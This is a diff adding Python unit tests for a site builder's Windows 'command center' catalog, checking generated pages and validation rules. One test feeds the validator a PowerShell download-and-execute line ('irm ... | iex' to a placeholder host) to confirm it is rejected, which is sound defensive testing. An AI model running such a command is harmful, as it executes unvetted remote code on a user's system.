@@ -58,6 +58,35 @@ class HubIntegrity(unittest.TestCase):
                 self.assertIn(note['commands'][0]['code'], guide)
                 self.assertIn('#### ⚡ Quick commands', guide)
 
+    def test_command_center_catalog_and_app_are_integrated(self):
+        catalog = json.loads((ROOT / 'data/command-center.json').read_text())
+        build.validate_command_center(catalog)
+        output = build.build_outputs()
+        embedded = json.loads(output['site/catalog.json'])
+        self.assertEqual(embedded['commandCenter']['commands'], catalog['commands'])
+        self.assertIn('data-nav="command-center"', output['site/index.html'])
+        self.assertIn('function commandCenterPage', output['site/index.html'])
+        self.assertIn('winget upgrade --all --interactive', output['site/index.html'])
+        self.assertIn('choco upgrade all --noop', output['site/index.html'])
+        self.assertIn('scoop update *', output['site/index.html'])
+        self.assertIn('Start-MpScan -ScanType FullScan', output['site/index.html'])
+        self.assertIn('Tron Script', output['site/index.html'])
+        self.assertIn('WinUtil', output['site/index.html'])
+        self.assertIn('command-center', output['site/build-manifest.json'])
+
+    def test_command_center_rejects_unknown_workflow_commands(self):
+        catalog = json.loads((ROOT / 'data/command-center.json').read_text())
+        broken = copy.deepcopy(catalog)
+        broken['workflows'][0]['commandIds'].append('not-a-command')
+        with self.assertRaisesRegex(ValueError, 'unknown or missing command'):
+            build.validate_command_center(broken)
+
+    def test_command_center_rejects_remote_pipe_execution(self):
+        catalog = json.loads((ROOT / 'data/command-center.json').read_text())
+        broken = copy.deepcopy(catalog)
+        broken['commands'][0]['code'] = 'irm https://example.invalid/a.ps1 | iex'
+        with self.assertRaisesRegex(ValueError, 'remote download-and-execute'):
+            build.validate_command_center(broken)
     def test_every_guide_and_tool_reaches_generated_output(self):
         output = build.build_outputs()
         catalog = json.loads(output['site/catalog.json'])
